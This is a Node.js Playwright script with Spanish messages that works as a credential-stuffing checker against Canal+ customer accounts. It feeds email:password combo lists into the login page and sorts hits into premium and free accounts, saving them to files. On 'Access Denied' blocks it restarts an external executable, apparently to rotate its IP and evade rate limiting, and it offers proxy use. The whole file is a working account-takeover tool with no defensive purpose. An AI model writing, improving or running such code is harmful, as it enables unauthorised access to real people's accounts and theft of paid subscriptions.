const fs = require('fs');
const readline = require('readline');
const { chromium } = require('playwright');
const chalk = require('chalk');
const cliProgress = require('cli-progress');
const ora = require('ora').default;
const { spawn, exec } = require('child_process');

const comboPath = 'C:\\Users\\opc\\Downloads\\canalplus-checker-con-node-main\\canalplus-checker-con-node-main\\combo.txt';
const validPath = 'C:\\Users\\opc\\Downloads\\canalplus-checker-con-node-main\\canalplus-checker-con-node-main\\validacceso.txt';
const freePath = 'C:\\Users\\opc\\Downloads\\canalplus-checker-con-node-main\\canalplus-checker-con-node-main\\free.txt';

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

let externalProcess = null;

function startExternalProgram() {
  if (externalProcess) return;
  externalProcess = spawn('C:\\Users\\opc\\Downloads\\usf\\u2211.exe', {
    detached: true,
    stdio: 'ignore'
  });
  externalProcess.unref();
  console.log(chalk.blue('? u2211.exe iniciado'));
}

function killExternalProgram() {
  return new Promise((resolve) => {
    exec('taskkill /IM u2211.exe /F', (error, stdout, stderr) => {
      if (error) {
        console.log(chalk.yellow(`?? No se pudo cerrar u2211.exe (posiblemente ya estaba cerrado): ${error.message}`));
      } else {
        console.log(chalk.red('? u2211.exe cerrado correctamente'));
        externalProcess = null;
      }
      resolve();
    });
  });
}

async function restartExternalProgram() {
  await killExternalProgram();
  startExternalProgram();
}

const ask = (question) => new Promise(resolve => rl.question(question, resolve));

async function trySelectors(page, selectors, action, value = null) {
  for (const selector of selectors) {
    try {
      const element = await page.waitForSelector(`xpath=${selector}`, { timeout: 3000 });
      if (action === 'fill') {
        await element.fill(value);
      } else if (action === 'click') {
        await element.click();
      }
      return selector;
    } catch (e) {
      continue;
    }
  }
  throw new Error(`Ninguno de los selectores fue válido para la acción ${action}`);
}

async function procesarCombo(combo, index, total, validCount, invalidCount) {
  let reintentar = true;

  while (reintentar) {
    const spinner = ora(`[${index + 1}/${total}] Comprobando ${combo}`).start();
    let browser = null;

    try {
      browser = await chromium.connectOverCDP('http://localhost:9222');
      const context = await browser.newContext();
      const page = await context.newPage();

      await page.goto('https://client.canalplus.com/?sc_intcmp=MYCWEB:USERMENU:EC');
      await page.waitForLoadState('load');

      await page.click('xpath=//*[@id="didomi-notice-agree-button"]/span').catch(() => {});
      await page.waitForTimeout(100);
      await page.click('xpath=//*[@id="app"]/div/div/main/div/div[2]/div[1]/div[1]/button');
      await page.waitForTimeout(100);

      const modal = await page.$('xpath=/html/body/div[2]/div/div[2]/div').catch(() => null);
      if (modal) {
        spinner.warn(chalk.magenta(`[${index + 1}/${total}] ?? Modal inesperado detectado, reiniciando entorno y reintentando combo...`));
        await browser.close();

        await restartExternalProgram();
        continue;
      }

      const [email, password] = combo.split(/:(.*)/).map(p => p.trim());

      const emailSelectors = ['//*[@id="input28"]', '//*[@id="input29"]', '//*[@id="input30"]'];
      const passSelectors = ['//*[@id="input36"]', '//*[@id="input37"]', '//*[@id="input38"]'];
      const loginBtnSelectors = ['//*[@id="form20"]/div[2]/input', '//*[@id="form21"]/div[2]/input', '//*[@id="form22"]/div[2]/input'];

      await trySelectors(page, emailSelectors, 'fill', email);
      await trySelectors(page, passSelectors, 'fill', password);
      await trySelectors(page, loginBtnSelectors, 'click');

      // NUEVO: Esperar y verificar si el HTML contiene "Access Denied"
      await page.waitForTimeout(3000);
      const htmlContent = await page.content();
      if (htmlContent.includes('Access Denied')) {
        spinner.warn(chalk.magenta(`[${index + 1}/${total}] ? Access Denied detectado en el HTML para ${combo}, reiniciando entorno y reintentando combo...`));
        await browser.close();
        await restartExternalProgram();
        continue; // Reintentar el mismo combo
      }

      const loginResult = await Promise.race([
        page.waitForSelector('xpath=//*[@id="error-message"]', { timeout: 11000 }).then(() => 'error').catch(() => null),
        page.waitForSelector('xpath=//*[@id="app"]/div/div/main/div/div[2]/nav/ul/li[2]/a/div[1]/div', { timeout: 14000 }).then(() => 'success').catch(() => null)
      ]);

      if (loginResult === 'error') {
        spinner.fail(chalk.red(`[${index + 1}/${total}] ${combo} ? INVÁLIDO | ? Válidos: ${validCount} | ? Inválidos: ${invalidCount + 1}`));
        await browser.close();
        return 'invalid';
      }

      if (loginResult === 'success') {
        const success = await page.$('xpath=//*[@id="app"]/div/div/main/div/div[2]/nav/ul/li[2]/a/div[1]/div');
        await success.click();
        await page.waitForTimeout(17000);

        const freeIndicator = await page.$('xpath=//*[@id="app"]/div/div/main/div/div/div/div[3]/h2');

        if (!freeIndicator) {
          spinner.warn(chalk.hex('#FFA500')(`[${index + 1}/${total}] ${combo} ?? VÁLIDO pero cuenta FREE | ? Válidos: ${validCount + 1} | ? Inválidos: ${invalidCount}`));
          fs.appendFileSync(freePath, combo + '\n', 'utf8');
        } else {
          spinner.succeed(chalk.green(`[${index + 1}/${total}] ${combo} ? PREMIUM | ? Válidos: ${validCount + 1} | ? Inválidos: ${invalidCount}`));
          fs.appendFileSync(validPath, combo + '\n', 'utf8');
          await browser.close();
          return 'valid';
        }

        await browser.close();
        return 'free';
      }

      spinner.warn(chalk.yellow(`[${index + 1}/${total}] ${combo} ?? Resultado incierto | ? Válidos: ${validCount} | ? Inválidos: ${invalidCount}`));
      await browser.close();
      return 'inconcluso';

    } catch (err) {
      if (browser) {
        await browser.close();
      }

      await restartExternalProgram();

      ora().warn(chalk.magenta(`[${index + 1}/${total}] ?? Error al procesar combo (${combo}): ${err.message}. Reintentando...`));
      continue;
    }
  }
}

(async () => {
  console.log(chalk.cyan('?? Asegúrate de que ya abriste Chrome con el puerto CDP habilitado (9222).'));

  startExternalProgram();

  const usarProxies = (await ask('¿Deseas usar proxy? (s/n): ')).toLowerCase();

  let proxyToShow = null;
  if (usarProxies === 's') {
    const proxyFilePath = await ask('Ingresa la ruta del archivo de proxies (ip:puerto): ');
    if (!fs.existsSync(proxyFilePath)) {
      console.log(chalk.red('? Archivo de proxies no encontrado.'));
      process.exit();
    }

    const proxies = fs.readFileSync(proxyFilePath, 'utf8').split('\n').map(p => p.trim()).filter(Boolean);

    if (proxies.length === 0) {
      console.log(chalk.red('? El archivo de proxies está vacío.'));
      process.exit();
    }

    proxyToShow = proxies[0];
    console.log(chalk.magenta(`?? Recuerda configurar este proxy manualmente en Chrome: ${proxyToShow}`));
  } else {
    console.log(chalk.yellow('?? Se ejecutará sin proxy.'));
  }

  const combosRaw = fs.readFileSync(comboPath, 'utf8').split('\n').map(l => l.trim()).filter(Boolean);

  const combos = combosRaw.filter(line => {
    const [email, password] = line.split(/:(.*)/).map(p => p.trim());
    return email && password;
  });

  const bar = new cliProgress.SingleBar({
    format: '{bar} | {percentage}% | {value}/{total} combos | ? Válidos: {valid} | ? Inválidos: {invalid}',
    barCompleteChar: '\u2588',
    barIncompleteChar: '\u2591',
    hideCursor: true
  }, cliProgress.Presets.shades_classic);

  bar.start(combos.length, 0, { valid: 0, invalid: 0 });

  let validCount = 0;
  let invalidCount = 0;

  for (let i = 0; i < combos.length; i++) {
    const combo = combos[i];
    const result = await procesarCombo(combo, i, combos.length, validCount, invalidCount);

    if (result === 'valid') validCount++;
    if (result === 'invalid') invalidCount++;

    bar.increment({ valid: validCount, invalid: invalidCount });
    await new Promise(resolve => setTimeout(resolve, 500));
  }

  bar.stop();
  rl.close();
  console.log(chalk.cyan('\n? Proceso terminado.'));
})();
